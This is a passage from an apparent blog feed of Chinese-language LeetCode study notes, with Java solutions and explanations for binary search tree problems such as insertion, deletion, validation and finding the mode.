class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int x) &#123; val = x; &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">lowestCommonAncestor</span><span class="params">(TreeNode root, TreeNode p, TreeNode q)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//缩小 确定范围在左子树</span></span><br><span class="line">        <span class="keyword">if</span>(root.val &gt; p.val &amp;&amp; root.val &gt; q.val) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">left</span> <span class="operator">=</span> lowestCommonAncestor(root.left,p,q);</span><br><span class="line">            <span class="comment">//注意判空</span></span><br><span class="line">            <span class="keyword">if</span>(left != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> left;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="comment">//缩小 确定范围在右子树</span></span><br><span class="line">        <span class="keyword">if</span>(root.val &lt; p.val &amp;&amp; root.val &lt; q.val) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">right</span> <span class="operator">=</span> lowestCommonAncestor(root.right,p,q);</span><br><span class="line">            <span class="comment">//注意判空</span></span><br><span class="line">            <span class="keyword">if</span>(right != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//p、q一个在左一个在右 那就是root是根节点</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树中的插入操作"><a href="#二叉搜索树中的插入操作" class="headerlink" title="二叉搜索树中的插入操作"></a>二叉搜索树中的插入操作</h4><p>link：<a href="https://leetcode.cn/problems/insert-into-a-binary-search-tree/description/">701. 二叉搜索树中的插入操作 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>根据题目描述遍历比较插入即可，和上题一样可以缩小范围进行判断.<br>题目又说任意地方插入，我们选插入叶子节点，只要遍历当前节点为空就说明扎到了向上返回即可.</p><h6 id="递归-1"><a href="#递归-1" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">insertIntoBST</span><span class="params">(TreeNode root, <span class="type">int</span> val)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">TreeNode</span> <span class="variable">node</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TreeNode</span>(val);</span><br><span class="line">            <span class="keyword">return</span> node;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(val &lt; root.val) &#123;</span><br><span class="line">            root.left = insertIntoBST(root.left,val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(val &gt; root.val) &#123;</span><br><span class="line">            root.right = insertIntoBST(root.right,val);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="删除二叉搜索树中的节点"><a href="#删除二叉搜索树中的节点" class="headerlink" title="删除二叉搜索树中的节点"></a>删除二叉搜索树中的节点</h4><p>link：<a href="https://leetcode.cn/problems/delete-node-in-a-bst/">450. 删除二叉搜索树中的节点 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>首先找到要删除的节点（如果是叶子节点的话删除不影响）只要不是叶子节点删除可以把右子树中的最小节点（即右子树的最左侧节点）或左子树中的最大节点（即左子树的最右侧节点）上移占位.<br>找目标删除的节点也可以用相同的方法缩小判断区间.<br><strong>六种可能性</strong><br>1.没有匹配key的节点<br>2.能找到但匹配值的为叶子节点<br>3.能找到匹配值不为叶子节点但<strong>左子树为空右子树也为空</strong><br>4.能找到匹配值不为叶子节点但<strong>左子树不为空右子树为空</strong><br>5.能找到匹配值不为叶子节点但<strong>左子树为空右子树不为空</strong><br>6.能找到匹配值不为叶子节点但<strong>左子树右子树都不为空</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">deleteNode</span><span class="params">(TreeNode root, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 找到要删除的节点</span></span><br><span class="line">        <span class="keyword">if</span> (root.val == key) &#123;</span><br><span class="line">            <span class="comment">// 情况1: 节点是叶子节点</span></span><br><span class="line">            <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况2: 节点只有左子树</span></span><br><span class="line">            <span class="keyword">if</span> (root.left != <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.left;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况3: 节点只有右子树</span></span><br><span class="line">            <span class="keyword">if</span> (root.left == <span class="literal">null</span> &amp;&amp; root.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.right;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 情况4: 节点有两个子树</span></span><br><span class="line">            <span class="keyword">if</span> (root.left != <span class="literal">null</span> &amp;&amp; root.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root.right;</span><br><span class="line">                <span class="keyword">while</span> (cur.left != <span class="literal">null</span>) &#123;</span><br><span class="line">                    cur = cur.left;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 将左子树连接到右子树的最小节点</span></span><br><span class="line">                cur.left = root.left;</span><br><span class="line">                <span class="comment">// 返回右子树</span></span><br><span class="line">                <span class="keyword">return</span> root.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 递归调用</span></span><br><span class="line">        <span class="keyword">if</span> (root.val &lt; key) &#123;</span><br><span class="line">            root.right = deleteNode(root.right, key); <span class="comment">// 更新右子树</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            root.left = deleteNode(root.left, key); <span class="comment">// 更新左子树</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> root; <span class="comment">// 返回更新后的根节点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> TreeNode <span class="title function_">deleteNode</span><span class="params">(TreeNode root, <span class="type">int</span> key)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(root.val == key) &#123;</span><br><span class="line">            <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(root.left != <span class="literal">null</span> &amp;&amp; root.right == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.left;</span><br><span class="line">            &#125;<span class="keyword">else</span> <span class="keyword">if</span>(root.left == <span class="literal">null</span> &amp;&amp; root.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> root.right;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//从左子树选取</span></span><br><span class="line">                <span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root.left;</span><br><span class="line">                <span class="comment">//遍历找到左子树最右侧的节点</span></span><br><span class="line">                <span class="keyword">while</span>(cur.right != <span class="literal">null</span>) &#123;</span><br><span class="line">                    cur = cur.right;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//将要删除节点的右子树连接到最右侧节点</span></span><br><span class="line">                cur.right = root.right;</span><br><span class="line">                <span class="comment">//更新当前节点为左子树的根节点</span></span><br><span class="line">                root = root.left;</span><br><span class="line">                <span class="keyword">return</span> root;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">            <span class="keyword">if</span>(root.val &lt; key) &#123;</span><br><span class="line">                root.right = deleteNode(root.right,key);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>( key &lt; root.val) &#123;</span><br><span class="line">                root.left = deleteNode(root.left,key);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>Tips</strong><br>为什么是cur.left &#x3D; root.left;?<br>假设我们有如下结构的树.</p><p><img src="/../imgs/2024-10/image-20241118141018034.png" alt="image-20241118141018034"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">TreeNode</span> <span class="variable">cur</span> <span class="operator">=</span> root.right; <span class="comment">// cur 现在指向 7</span></span><br><span class="line"><span class="keyword">while</span> (cur.left != <span class="literal">null</span>) &#123;</span><br><span class="line">    cur = cur.left; <span class="comment">// cur 最终指向 null（右子树最小节点）</span></span><br><span class="line">&#125;</span><br><span class="line">cur.left = root.left; <span class="comment">// 将左子树连接到最小节点</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;二叉搜索树的最近公共祖先&quot;&gt;&lt;a href=&quot;#二叉搜索树的最近公共祖先&quot; class=&quot;headerlink&quot; title=&quot;二叉搜索树的最近公共祖先&quot;&gt;&lt;/a&gt;二叉搜索树的最近公共祖先&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x14</title>
    <link href="https://yubut.github.io/2024/11/14/yub%E3%81%AEAlgorithm.0x14/"/>
    <id>https://yubut.github.io/2024/11/14/yub%E3%81%AEAlgorithm.0x14/</id>
    <published>2024-11-14T03:25:26.000Z</published>
    <updated>2024-11-14T13:08:32.477Z</updated>
    
    <content type="html"><![CDATA[<h4 id="验证二叉搜索树"><a href="#验证二叉搜索树" class="headerlink" title="验证二叉搜索树"></a>验证二叉搜索树</h4><p>link：<a href="https://leetcode.cn/problems/validate-binary-search-tree/description/">98. 验证二叉搜索树 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>搞清二叉搜索树的定义即可.(根节点的左子树比根节点小，右子树比根节点大且每个子树都满足)<br><img src="/../imgs/2024-10/image-20241114113444728.png" alt="image-20241114113444728"></p><p>但其实上述思路是是不对， 跑一下代码发现测试样例值通过了一部分.那是哪里出问题了？（烧烤）<br>比较的应该是左子树所有节点小于中间节点，右子树所有节点大于中间节点.<br><strong>查资料发现二叉搜索树也可以为空</strong></p><h6 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> validBST(Long.MIN_VALUE, Long.MAX_VALUE, root);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">validBST</span><span class="params">(<span class="type">long</span> lower, <span class="type">long</span> upper, TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (root.val &lt;= lower || root.val &gt;= upper) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> validBST(lower, root.val, root.left) &amp;&amp; validBST(root.val, upper, root.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h6><p>采用pre指针遍历对比记录前一个节点内容，进行中序遍历比较.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValidBST</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">left</span> <span class="operator">=</span> isValidBST(root.left);</span><br><span class="line">        <span class="comment">//确保至少以及遍历过一个节点</span></span><br><span class="line">        <span class="keyword">if</span>(pre != <span class="literal">null</span> &amp;&amp; pre.val &gt;= root.val) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//更新节点</span></span><br><span class="line">        pre = root;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">right</span> <span class="operator">=</span> isValidBST(root.right);</span><br><span class="line">        <span class="keyword">return</span> left &amp;&amp; right;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树的最小绝队差"><a href="#二叉搜索树的最小绝队差" class="headerlink" title="二叉搜索树的最小绝队差"></a>二叉搜索树的最小绝队差</h4><p>link：<a href="https://leetcode.cn/problems/minimum-absolute-difference-in-bst/description/">530. 二叉搜索树的最小绝对差 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p>和上一题一样，用一个指针记录遍历比较再用一个大数值记录结果即可.【注意取值】</p><h6 id="中序遍历-1"><a href="#中序遍历-1" class="headerlink" title="中序遍历"></a>中序遍历</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span class="comment"> *         this.val = val;</span></span><br><span class="line"><span class="comment"> *         this.left = left;</span></span><br><span class="line"><span class="comment"> *         this.right = right;</span></span><br><span class="line"><span class="comment"> *     &#125;</span></span><br><span class="line"><span class="comment"> * &#125;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="type">TreeNode</span> <span class="variable">pre</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> Integer.MAX_VALUE;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getMinimumDifference</span><span class="params">(TreeNode root)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//左</span></span><br><span class="line">        getMinimumDifference(root.left);</span><br><span class="line">        <span class="comment">//判断</span></span><br><span class="line">        <span class="keyword">if</span>(pre != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> root.val - pre.val;</span><br><span class="line">            <span class="keyword">if</span>(tmp &lt; result) &#123;</span><br><span class="line">                result = tmp;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//更新节点</span></span><br><span class="line">        pre = root;</span><br><span class="line">        <span class="comment">//右</span></span><br><span class="line">        getMinimumDifference(root.right);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="二叉搜索树中的众数"><a href="#二叉搜索树中的众数" class="headerlink" title="二叉搜索树中的众数"></a>二叉搜索树中的众数</h4><p>link：<a href="https://leetcode.cn/problems/find-mode-in-binary-search-tree/">501. 二叉搜索树中的众数 - 力扣（LeetCode）</a></p><h5 id="思路分析-2"><a href="#思路分析-2" class="headerlink" title="思路分析"></a>思路分析</h5><p>最直接就是直接遍历搜索，使用Map比较记录.但是这样就失去了搜索二叉树的意义.<br>所以我们还是选择中序遍历的方式，需要定义count（记录当前节点出现的次数）和maxCount（出现次数最多的节点），再定义一个pre作为记录节点方便比较.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * public class TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     TreeNode left;</span></span><br><span class="line"><span class="comment"> *     TreeNode right;</span></span><br><span class="line"><span class="comment"> *     TreeNode() &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val) &#123; this.val = val; &#125;</span></span><br><span class="line"><span class="comment"> *     TreeNode(int val, TreeNode left, TreeNode right) &#123;</span></span><br><span class="line"><span 